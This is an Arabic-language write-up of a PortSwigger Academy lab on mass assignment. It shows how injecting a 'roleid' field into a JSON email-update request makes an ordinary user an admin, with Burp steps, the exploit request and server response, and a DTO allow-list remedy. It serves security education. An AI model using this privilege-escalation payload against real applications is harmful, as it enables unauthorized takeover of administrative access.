# Lab 04 — User Role Can Be Modified in User Profile (تعديل الرتبة عبر البروفايل / Mass Assignment)

[![التصنيف](https://img.shields.io/badge/الفئة-Broken%20Access%20Control-red)]()
[![النوع](https://img.shields.io/badge/النوع-Vertical%20Broken%20Access%20Control%20(Mass%20Assignment)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/access-control)

> هذا الشرح جزء من سلسلة [معامل التحكم في الوصول (BAC)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 04 — User Role Can Be Modified in User Profile (تعديل الرتبة عبر البروفايل / Mass Assignment) |
| **تصنيف الثغرة** | Vertical Broken Access Control (Mass Assignment) |
| **معيار الضعف (CWE)** | CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | ترقية حساب wiener إلى رتبة أدمن عبر حقن حقل roleid في تحديث البروفايل، ثم حذف carlos. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يستخدم التطبيق صيغة JSON لتحديث بيانات المستخدم (مثل البريد الإلكتروني). عندما يقوم المستخدم بتحديث إيميله، يرسل المتصفح `POST /my-account/change-email` مع محتوى `{"email": "test@test.com"}`. في المقابل، ترجع استجابة السيرفر الكائن كاملاً: `{"username": "wiener", "email": "test@test.com", "roleid": 1}`.

**الخلل الفكري هنا (Mass Assignment):** في الباك إند، يستخدم المطور إطار عمل (Framework) يأخذ كل حقول الـ JSON القادمة من المستخدم ويربطها مباشرة بخصائص كائن المستخدم في قاعدة البيانات. لم يضع المطور قائمة بيضاء (Allow-list) تحدد ما يجوز تعديله فقط، فإذا أضاف المهاجم `"roleid": 2` في جسم الطلب، يقوم السيرفر بحفظها في قاعدة البيانات وترقيته لأدمن!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يحلل استجابة الـ JSON ليكتشف الحقول الحساسة الداخلية للمستخدم (`roleid`)، ثم يحقنها داخل طلب التحديث لتجاوز منطق الأعمال وترقية حسابه.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور اعتمد على ميزة الربط التلقائي في أطر الـ ORM الحديثة (Model Binding) دون تقييد الحقول المقبولة بواسطة نمط DTO مخصص.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل الدخول بحساب `wiener:peter`.
2. قم بتحديث بريدك الإلكتروني إلى أي إيميل تجريبي.
3. في Burp Suite، اعترض أو راجع طلب `POST /my-account/change-email` واستجابته في HTTP History.
4. لاحظ أن السيرفر يرجع استجابة JSON تحتوي على: `"roleid": 1`.
5. أرسل طلب تعديل الإيميل إلى **Repeater**، وعدّل الـ JSON ليصبح كالتالي:
```json
{
  "email": "test@attacker.com",
  "roleid": 2
}
```
6. أرسل الطلب، ولاحظ في الاستجابة أن `"roleid": 2` تم حفظها بنجاح!
7. الآن حدّث الصفحة في المتصفح، ستجد أنك أصبحت Admin وظهرت لك لوحة الإدارة `/admin`.
8. ادخل على `/admin` واحذف المستخدم `carlos`.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/change-email HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/json
Cookie: session=...

{
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

---

## 6. الأثر الواقعي للثغرة (Impact)

الاستيلاء الكامل على صلاحيات الإدارة العليا من خلال ثغرة إسناد الحقول (Mass Assignment).

---

## 7. الحماية والإغلاق البرمجي (Remediation)

يجب استخدام كائنات نقل البيانات (Data Transfer Objects - DTOs) بشكل صارم لتحديد الحقول القابلة للتعديل من قِبل المستخدم فقط (مثل Email, FullName)، ومنع الربط المباشر لأي حقل تنظيمي أو رتبي كـ `roleid`.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — Access Control](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE Database Details](https://cwe.mitre.org/)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
